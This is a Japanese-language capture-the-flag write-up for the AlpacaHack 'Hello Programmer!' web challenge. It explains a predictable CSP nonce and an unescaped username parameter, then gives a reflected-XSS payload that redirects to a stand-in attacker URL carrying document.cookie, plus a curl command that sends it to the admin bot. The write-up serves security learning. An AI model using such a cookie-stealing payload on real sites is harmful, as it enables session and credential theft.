---
title: Daily-AlpacaHack 「Hello Programmer!」Medium
description: Reflected_XSS, CSP
date: 2026-05-28 08:17:00 +0900
categories: [CyberSecurity, CTF]
tags: [daily_alpaca_hack, web, vuln/xss]
---

# 20260527-daily-web-medium-Hello_Programmer

> - **Category**: web
> - **Description**: こんにちは！
> - **Tech Stack**: Python, JavaScript
{: .prompt-info }

**階層構造**
```
.
├── bot
│   ├── bot.js
│   ├── Dockerfile
│   ├── index.js
│   ├── package.json
│   ├── package-lock.json
│   └── views
│       └── index.ejs
├── compose.yaml
└── web
    ├── Dockerfile
    ├── index.js
    ├── package.json
    ├── package-lock.json
    └── views
        └── index.ejs

5 directories, 12 files
```

---
## Solution Path

### **CSP (Content Security Policy)** の設定

CSPはブラウザが，どのリソースを読み込み・実行できるかを制御するための機構です[^1]．(**HTTP Response Header**)
このプログラムでは，正しい `nonce` を持つ **インライン script/style** タグのみ許可される設定になっています．

```python
#...
    response.headers["Content-Security-Policy"] = (
        "default-src 'none'; " # 正しいnonceを持つ インラインscript/style タグ以外の操作は全て禁止
        f"script-src 'nonce-{nonce}'; " # レスポンスヘッダのnonceと一致するnonce属性を持つ <script> タグ内のJavaScriptは実行可能
        f"style-src 'nonce-{nonce}'; " # 正しいnonceを持つ <style> タグ，あるいはstyle属性 (style-srcにunsafe-inlineがないためタグのみが対象) によるスタイル適用が可能
        "object-src 'none'; " # プラグイン読み込み不可
        "base-uri 'none'; " # <base> タグによる相対パスの基準URL操作の禁止
        "frame-ancestors 'none'" # このページ自体が <iframe> などで他サイトから埋め込まれることの禁止
    )
#...
```

#### 例外的な挙動

CSPの仕様上，以下の挙動は上記のポリシーを記述していても制限されません．

- **トップレベルナビゲーション (画面遷移)**:
    - CSPは **リソースの読み込み** や **通信** を制限しますが，`window.location = "..."` や `<meta http-equiv="refresh">` を用いた **ブラウザ全体のURL遷移** は，ポリシーの直接的な制御対象外です．

### POST: `/api/report`

渡されたIPアドレスのうち，片方は，`Report to Admin Bot` というページに繋がっています．
フォームに対して入力したパスが，`/api/report` というAPIに `path` パラメータとして渡され，`"http://localhost:3000/" + path` の形で結合されます．

**`bot/view/index.ejs`: クライアント側でのAPI呼び出し**
```javascript
//...
$response.textContent = "Response from bot: " + await(await fetch("/api/report", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ path }),
          })).text();
//...
```

**`bot/index.js`: サーバ側でのAPI定義**
```javascript
app.post("/api/report", async (req, res) => {
  const { path } = req.body;
  if (typeof path !== "string") {
    return res.status(400).send("Invalid path");
  }
  const url = APP_URL + path; // "http://localhost:3000/" + path

  try {
    await visit(url);
    return res.send("OK");
  } catch (e) {
    console.error(e);
    return res.status(500).send("Something wrong");
  }
});
```

構築されたURLに対して，`visit(url)` し，成功すれば **OK** を返すようです．
また，`visit` 関数は，渡された `url` に対して，**Headless Chromium** を使用して，`FLAG` を含む **Cookie** を所持した状態でアクセスするようです．

**`bot/bot.js`: visit()**
```javascript
//...
export const visit = async (url) => {
  console.log(`Start visiting: ${url}`);

  const browser = await puppeteer.launch({
    headless: "new",
    pipe: true,
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  try {
    const page = await browser.newPage();
    await page.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: new URL(APP_URL).hostname,
      path: "/",
    });
    await page.goto(url, { timeout: 5000 });
    await sleep(5000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await browser.close();

  console.log(`End visiting: ${url}`);
};
```

### 1. 不適切な `nonce` の生成

本来，**nonce** はリクエストごとに推測不可能な値である必要があります．しかし，`secrets.token_bytes` を関数として呼び出さず，オブジェクトのまま `str()` に渡しています．
これにより，`secrets.token_bytes` のメモリアドレスを含む文字列をそのまま **nonce** にしています．具体的には，出力は `<function token_bytes at 0x7f...>` のようになります．
よって，一度値が固定されるとプロセスの再起動まで使い回される **(予測可能になる)** という不備が生まれています．

```python
#...
@app.before_request
def set_nonce():
    g.nonce = base64.b64encode(str(secrets.token_bytes).encode()).decode("ascii") # 本来であれば，secrets.token_bytes(16) のように記載されるべき
#...
```

### 2. `username` のエスケープ不足による **反射型XSS**

`web/app.py` において，`username = request.args.get("username", "...")` となっています．
これは，URLのクエリパラメータ `?username=...` から値を取得する実装ですが，その値に対してのエスケープ処理が一切記載されていません．
`INDEX.format(...)` で事前に定義されたHTML文字列 (`INDEX`) の中に，取得した `username` と生成された `nonce` をそのまま埋め込んでいます．

これにより，入力がただの文字列として扱われず，**HTMLの一部** として解釈されうる状態になっています．
埋め込まれている `nonce` を取り出し，実際に以下の例でアクセスすると，XSSが発火することが分かります．

例: `/?username=<script%20nonce="xxxx"%20defer>alert(1)</script>`

次は，どのように `/api/report` が発行する **Flagを含むCookie** をこのXSSを通じて漏洩させるかを考えます．

**`web/app.py`: エスケープされていない `username`**
```python
INDEX = """
<!DOCTYPE html>
<html lang="en">
#...
</head>
<body>
    <h1>Hello {username}!</h1>
#...
</body>
</html>
""".strip()
```

---
## Exploitation

### 1. `Nonce` の窃取

ブラウザの開発者ツールのネットワークタブを用いて，レスポンス全体のソースから `nonce` を抜き取ります．

`<ip>.html`
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>Hello!</title>
    <style nonce="<NONCE>">
        h1 {
            color: transparent;
            background: linear-gradient(90deg,red,orange,yellow,lime,cyan,blue,violet,red) 0/200%;
            -webkit-background-clip: text;
            animation: rainbow 1s linear infinite
        }
        @keyframes rainbow {
            to {
                background-position:200%
            }
        }
    </style>
</head>
<body>
    <h1>Hello programmer!</h1>
    <script nonce="<NONCE>" defer>
        const h1 = document.querySelector("h1");
        h1.addEventListener("click", () => {
            alert(h1.textContent);
        })
    </script>
</body>
</html>
```

### 2. **Flag** の窃取

抜き取った `nonce` を利用します．
CSPの例外的な挙動として述べた，`location` オブジェクトを利用して，chromiumに取得させたCookieを自身のサーバにクエリパラメータとして飛ばします．
また，サーバには **WebHook.site**[^2] を利用します．

**XSS ペイロード**
```
Raw Text:
?username=<script nonce="xxxx" defer>window.location="<ATTACKER_URL>/?flag="+encodeURIComponent(document.cookie)</script>
```

コマンドを実行したのち，ブラウザからサーバのログにアクセスすると，`Query strings` として，**FLAG** が入手できました．

```shell
$ curl -X POST http://<ip>:<port>/api/report \
     -H "Content-Type: application/json" \
     -d '{
       "path": "/?username=<URL_ENCODED_PAYLOAD>"}'
OK
```

### ペイロードの仕組み

#### 1. ブラウザによる検証と実行

1. **HTMLへの埋め込み**: サーバーは，あなたが送信した `username` パラメータの内容をそのままHTMLの `<h1>Hello ... !</h1>` の位置に挿入します．
2. **CSPの検証**: ブラウザがこのページを読み込む際，ページに設定されている **CSP** をチェックします．
    - ブラウザは **「この `<script>` タグには `nonce="xxxx"` がついているか」** と確認します．
    - もしその `xxxx` が，サーバーがレスポンスヘッダで指定した正しい `nonce` と一致していれば，ブラウザはこのスクリプトを信頼できるものと判断し，実行を許可します．

#### 2. データの抽出と持ち出し

- **`document.cookie` の読み取り**: ブラウザが現在保持している該当ドメインの Cookie を取得します．
- **URLの構築**: `location` への代入操作により，ブラウザは 「**現在のページから指定された URL へ移動せよ**」 という命令を受け取ります．
    - この時，Flag が URL のクエリパラメータ (`?flag=...`) として結合されます．
    - `encodeURIComponent` を使用することで，Cookie に含まれる特殊文字が URL で安全に扱える形式に変換され，正しくサーバーに届くようになります．

#### 3. 通信の実現 (CSP回避の仕組み)

前述の通り，CSP の `default-src 'none'` は `fetch()` や `XMLHttpRequest` はブロックしますが，**トップレベルナビゲーション(画面遷移)** は **ブロックしません**．
`location = "..."` を実行することは，JavaScript で通信を行うのではなく，ブラウザの機能を使って 「**今見ているページを別の場所へ切り替える**」 ことを意味します．
そのため，この動作は CSP の通信制限の対象外として，ブラウザは攻撃者の指定したURLに対して，**Flag** を保持したまま移動してしまいます．

---
## Post-Mortem & Dead ends

## References

[^1]: [Content security policy \| Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)

[^2]: [Webhook.site - Test, transform and automate Web requests and emails](https://webhook.site)